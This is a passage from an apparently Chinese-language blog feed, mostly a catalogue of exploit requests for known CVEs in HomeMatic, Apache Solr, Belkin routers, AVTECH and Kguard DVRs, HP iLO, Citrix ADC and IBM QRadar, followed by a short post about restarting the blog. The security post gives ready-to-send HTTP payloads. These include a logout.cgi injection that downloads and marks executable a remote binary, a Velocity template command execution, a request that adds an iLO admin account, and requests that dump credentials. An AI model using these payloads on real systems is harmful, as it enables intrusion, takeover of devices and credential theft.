RCE"></a>HomeMatic Zentrale CCU2 RCE</h3><h4 id="description-4"><a href="#description-4" class="headerlink" title="description"></a>description</h4><p>首先向 <strong>/api/backup/version.cgi</strong> 发送GET请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/backup/version.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Python-urllib/2.7</span><br></pre></td></tr></table></figure><p>如果返回了VERSION=x.x.x则继续发送payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/backup/logout.cgi?sid=aa&quot;);system.Exec(&quot;wget+-O+/tmp/exploit+http://127.0.0.1:1234/exploit&amp;&amp;chmod+%2bx+/tmp/exploit&quot;);system.ClearSessionID(&quot;bb</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Python-urllib/2.7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reference-4"><a href="#reference-4" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/45052">https://www.exploit-db.com/exploits/45052</a></p><h3 id="CVE-2019-0192-amp-CVE-2019-0193-Apache-Solr-RCE"><a href="#CVE-2019-0192-amp-CVE-2019-0193-Apache-Solr-RCE" class="headerlink" title="CVE-2019-0192 &amp; CVE-2019-0193- Apache Solr RCE"></a>CVE-2019-0192 &amp; CVE-2019-0193- Apache Solr RCE</h3><h4 id="description-5"><a href="#description-5" class="headerlink" title="description"></a>description</h4><p>CVE-2019-0192</p><ol><li>GET请求 <strong>/solr/admin/cores?wt=json</strong> ，如果响应中包含 <strong>status</strong> 字段如{“status”:{“abcdefgh”:”1”},}，则存在cores节点</li><li>之后向 <strong>/solr/abcdefgh/config</strong> 发送POST请求。</li></ol><p>CVE-2019-0193</p><ol><li>GET请求 <strong>/solr/admin/cores</strong> ，跟上一个类似的是响应中包含 <strong>status</strong> 字段则存在cores节点。</li><li>GET请求 <strong>/solr/admin/info/system</strong> ，获取响应中 <strong>system</strong> 字段的 <strong>name</strong> 、 <strong>uname</strong> 和 <strong>version</strong> 。</li><li>POST请求 <strong>/solr/abcdefgh/config</strong> —— init node config。</li><li>GET请求<code>/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27&lt;-----command-----&gt;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code>执行任意代码。</li></ol><h4 id="reference-5"><a href="#reference-5" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE">https://github.com/Imanfeng/Apache-Solr-RCE</a><br><a href="https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py">https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py</a><br><a href="https://www.exploit-db.com/exploits/47572">https://www.exploit-db.com/exploits/47572</a></p><h3 id="Belkin-N600DB-Multiple-Vulnerabilities"><a href="#Belkin-N600DB-Multiple-Vulnerabilities" class="headerlink" title="Belkin N600DB - Multiple Vulnerabilities"></a>Belkin N600DB - Multiple Vulnerabilities</h3><h4 id="description-6"><a href="#description-6" class="headerlink" title="description"></a>description</h4><p>Disclore wifi password:<br><code>curl --silent &quot;http://192.168.2.1/langchg.cgi&quot;</code> , <code>curl --silent &quot;http://192.168.2.1/adv_wifidef.cgi&quot;</code><br>Closed “HTTPD server” port:<br><code>curl --silent &quot;http://192.168.2.1/removepwd.cgi&quot; --data &quot;&quot;</code><br>Web Backdoor:<br><code>http://192.168.2.1/dev.htm</code><br>Server-Side Request Forgery (HTTP/FTP):<br><code>curl --silent &quot;http://192.168.2.1/proxy.cgi?chk&amp;url=http://45.33.32.156/&quot;</code><br>Command Injection:<br><code>curl --silent &quot;http://192.168.2.1/proxy.cgi?chk&amp;url=--help&quot;</code></p><h4 id="reference-6"><a href="#reference-6" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/43682">https://www.exploit-db.com/exploits/43682</a></p><h3 id="AVTECH-DVR-multiple-vulnerabilities"><a href="#AVTECH-DVR-multiple-vulnerabilities" class="headerlink" title="AVTECH DVR multiple vulnerabilities"></a>AVTECH DVR multiple vulnerabilities</h3><h4 id="description-7"><a href="#description-7" class="headerlink" title="description"></a>description</h4><p>在AVTHCH AVN801 DVR中发现了多个漏洞：</p><ol><li>CVE-2013-4980：通过利用RTSP数据包处理程序中的缓冲区溢出来执行任意代码<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SETUP Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: VLC media player (LIVE555 Streaming Media v2010.02.10)</span><br></pre></td></tr></table></figure></li><li>CVE-2013-4981：通过特制的HTTP POST请求利用 <strong>/cgi-bin/user/Config.cgi</strong> 中的缓冲区溢出来执行任意代码<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/user/Config.cgi?action=set&amp;Network.SMTP.Receivers=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></table></figure></li><li>CVE-2013-4982：绕过管理登录控制台的验证码，启用多个automated attack vectors。uri中有 <strong>/cgi-bin/nobody/VerifyCode.cgi</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cgi-bin&#x2F;nobody&#x2F;VerifyCode.cgi?account&#x3D;YWRtaW46YWRtaW4&#x3D;&amp;captcha_code&#x3D;FMUA&amp;verify_code&#x3D;FMUYyLOivRpgc HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: identity</span><br></pre></td></tr></table></figure></li></ol><h4 id="reference-7"><a href="#reference-7" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.coresecurity.com/core-labs/advisories/avtech-dvr-multiple-vulnerabilities">https://www.coresecurity.com/core-labs/advisories/avtech-dvr-multiple-vulnerabilities</a></p><h3 id="CVE-2017-12542"><a href="#CVE-2017-12542" class="headerlink" title="CVE-2017-12542"></a>CVE-2017-12542</h3><h4 id="description-8"><a href="#description-8" class="headerlink" title="description"></a>description</h4><p>iLO 全名是 Integrated Lights-out，它是惠普某些型号的服务器上集成的远程管理端口，它能够允许用户基于不同的操作系统从远端管理服务器。iLO 4中的CVE-2017-12542可以允许未经身份验证的远程攻击者绕过验证并执行任意代码。<br>当uri等于 <strong>/rest/v1/Accountservice/Accounts</strong> 且HTTP Headers中的Connection字段大于等于29个字符时即可绕过验证。在exp中如果收到的json中没有error和Items字段则认为漏洞存在。<br>向目标post添加用户的数据包，且Connection仍然大于等于29个字符，即可成功添加用户。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rest/v1/accountservice/accounts</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.19.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 253</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;UserName&quot;: &quot;admin&quot;, &quot;Password&quot;: &quot;admin123&quot;, &quot;Oem&quot;: &#123;&quot;Hp&quot;: &#123;&quot;Privileges&quot;: &#123;&quot;RemoteConsolePriv&quot;: true, &quot;iLOConfigPriv&quot;: true, &quot;VirtualMediaPriv&quot;: true, &quot;UserConfigPriv&quot;: true, &quot;VirtualPowerAndResetPriv&quot;: true, &quot;LoginPriv&quot;: true&#125;, &quot;LoginName&quot;: &quot;admin&quot;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reference-8"><a href="#reference-8" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py">https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py</a><br><a href="https://www.freebuf.com/vuls/167124.html">https://www.freebuf.com/vuls/167124.html</a></p><h3 id="CVE-2019-19781"><a href="#CVE-2019-19781" class="headerlink" title="CVE-2019-19781"></a>CVE-2019-19781</h3><h4 id="description-9"><a href="#description-9" class="headerlink" title="description"></a>description</h4><p>Citrix ADC的RCE漏洞。在 <strong>/vpns/</strong> 路径中有一个目录遍历漏洞。</p><ul><li>首先通过POST请求通过目录遍历漏洞创建恶意XML，payload包含在POST data中<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vpn/../vpns/portal/scripts/newbm.pl</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">NSC_USER</span>: ../../../netscaler/portal/templates/sobxivwokx</span><br><span class="line"><span class="attribute">NSC_NONCE</span>: 7</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 97</span><br><span class="line"></span><br><span class="line">url=127.0.0.1&amp;title=[% template.new(&#123;&#x27;BLOCK&#x27;=&#x27;print readpipe( xxxx )&#x27;&#125;)%]&amp;desc=desc&amp;UI_inuse=a</span><br></pre></td></tr></table></figure></li><li>然后通过GET请求去执行payload<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vpn/../vpns/portal/sobxivwokx.xml</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">NSC_USER</span>: dgxgvoankd</span><br><span class="line"><span class="attribute">NSC_NONCE</span>: 7</span><br></pre></td></tr></table></figure></li></ul><h4 id="reference-9"><a href="#reference-9" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/MalwareTech/CitrixHoneypot/blob/master/CitrixHoneypot.py">https://github.com/MalwareTech/CitrixHoneypot/blob/master/CitrixHoneypot.py</a><br><a href="https://github.com/trustedsec/cve-2019-19781">https://github.com/trustedsec/cve-2019-19781</a><br><a href="https://github.com/jas502n/CVE-2019-19781">https://github.com/jas502n/CVE-2019-19781</a><br><a href="https://www.jianshu.com/p/03b175711524">https://www.jianshu.com/p/03b175711524</a><br><a href="https://www.anquanke.com/post/id/197074?native.theme=2">https://www.anquanke.com/post/id/197074?native.theme=2</a></p><h3 id="Kguard-SHA104-SHA108-Bypass-Command-Injection"><a href="#Kguard-SHA104-SHA108-Bypass-Command-Injection" class="headerlink" title="Kguard SHA104 / SHA108 Bypass / Command Injection"></a>Kguard SHA104 / SHA108 Bypass / Command Injection</h3><h4 id="description-10"><a href="#description-10" class="headerlink" title="description"></a>description</h4><p>sha104和sha108都是Kguard公司的数字硬盘录像机，在处理身份验证和授权方面存在缺陷。例如，请求HI_SRDK_SYS_USERMNG_GetUserList会显示所有的用户名和密码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">REMOTE HI_SRDK_SYS_USERMNG_GetUserList MCTP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Accept</span>: text/HDP</span><br><span class="line"><span class="attribute">Content-Type</span>: text/HDP</span><br><span class="line"><span class="attribute">Func-Version</span>: 0x10</span><br><span class="line"><span class="attribute">Content-Length</span>: 51</span><br><span class="line"><span class="attribute">3Segment-Num</span>: 1</span><br><span class="line"><span class="attribute">Segment-Seq</span>: 1</span><br><span class="line"><span class="attribute">Data-Length</span>: 4</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">VMCTP/1.0 200 OK</span><br><span class="line"><span class="attribute">Content-Type</span>: text/HDP</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Return-Code</span>: 0</span><br><span class="line"><span class="attribute">Content-Length</span>: 2326</span><br><span class="line"><span class="attribute">Segment-Num</span>: 2</span><br><span class="line"><span class="attribute">Segment-Seq</span>: 1</span><br><span class="line"><span class="attribute">Data-Length</span>: 2240</span><br><span class="line"><span class="attribute">eric</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">admin</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">111222</span></span><br></pre></td></tr></table></figure><p>特征是在Request中的HTTP版本部分是 <strong>MCTP</strong> 。另外还可以进行更改用户密码等操作。</p><h4 id="reference-10"><a href="#reference-10" class="headerlink" title="reference"></a>reference</h4><p><a href="https://cxsecurity.com/issue/WLB-2015030061">https://cxsecurity.com/issue/WLB-2015030061</a></p><h3 id="IBM-QRadar-SIEM-Unauthenticated-Remote-Code-Execution"><a href="#IBM-QRadar-SIEM-Unauthenticated-Remote-Code-Execution" class="headerlink" title="IBM QRadar SIEM Unauthenticated Remote Code Execution"></a>IBM QRadar SIEM Unauthenticated Remote Code Execution</h3><h4 id="description-11"><a href="#description-11" class="headerlink" title="description"></a>description</h4><p>uri:  <strong>/ForensicsAnalysisServlet/</strong><br>在第二个链接中有具体的利用过程。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ForensicsAnalysisServlet/?action=someaction</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Cookie</span>: SEC=owned; QRadarCSRF=superowned;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line">&#123;&quot;exceptionMessageValue&quot;:&quot;javax.servlet.ServletException: No valid forensics analysis solrDocIds parameter found.&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="reference-11"><a href="#reference-11" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/45005">https://www.exploit-db.com/exploits/45005</a><br><a href="https://ssd-disclosure.com/ssd-advisory-qradar-remote-command-execution/">https://ssd-disclosure.com/ssd-advisory-qradar-remote-command-execution/</a></p><h3 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h3><p>docker, es, hbase, hadoop, phpadmin, cms, couchdb, orientdb, upnp, ipmi, rpc, a2billing, boa</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution&quot;&gt;&lt;a href=&quot;#CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution&quot; class=&quot;headerlink&quot; title=&quot;CV</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Back to blog</title>
    <link href="http://woodpile27.cn/2020/08/08/hello-world/"/>
    <id>http://woodpile27.cn/2020/08/08/hello-world/</id>
    <published>2020-08-08T00:00:00.000Z</published>
    <updated>2020-09-15T10:24:06.548Z</updated>
    
    <content type="html"><![CDATA[<p>今天换了id，把原来的github.io项目给删了，要重新开始写博客啦~</p><h3 id="Why-restart"><a href="#Why-restart" class="headerlink" title="Why restart"></a>Why restart</h3><p>如果没有记错的话，上次写博客还是大二的时候，写博客本就是个好习惯，但是自己没能坚持下来。前不久wenji师傅请我吃饭时，强烈建议我养成记笔记或者写博客的习惯，把自己平时遇到的问题以及解决方法进行记录，可以提高自己的文字表达能力，而博客更是一个很好的展示自己的平台。我深以为然，决定开始养成这个习惯，逐渐把它变成”例行公事”。</p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>借用老板在这周开会时说的两句话吧：<strong>是否觉得在做的事情有意思？是否给部门带来了价值？</strong><br>弗洛伊德认为，people are comfortably numb，大多数人都活在舒适的麻木中。我们应该培育自己的积极性和激情。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天换了id，把原来的github.io项目给删了，要重新开始写博客啦~&lt;/p&gt;
&lt;h3 id=&quot;Why-restart&quot;&gt;&lt;a href=&quot;#Why-restart&quot; class=&quot;headerlink&quot; title=&quot;Why restart&quot;&gt;&lt;/a&gt;Why resta</summary>
      
    
    
    
    
  </entry>
  
</feed>
